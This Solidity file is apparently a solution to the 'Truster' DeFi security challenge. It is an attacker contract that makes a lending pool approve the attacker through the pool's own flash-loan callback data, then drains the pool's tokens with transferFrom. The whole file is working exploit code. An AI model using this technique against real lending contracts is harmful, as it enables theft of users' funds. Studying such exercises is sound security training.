// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./TrusterLenderPool.sol";

contract TrusterAttacker {    

    function attack(
        address _poolAddress,
        uint256 _amount,
        address _token
    ) external {
        TrusterLenderPool _pool = TrusterLenderPool(_poolAddress);
        bytes memory data = abi.encodeWithSignature(
                    "approve(address,uint256)", address(this), _amount
                );

        _pool.flashLoan(0, msg.sender, _token, data);

        ERC20(_token).transferFrom(_poolAddress, msg.sender, _amount);
    }
}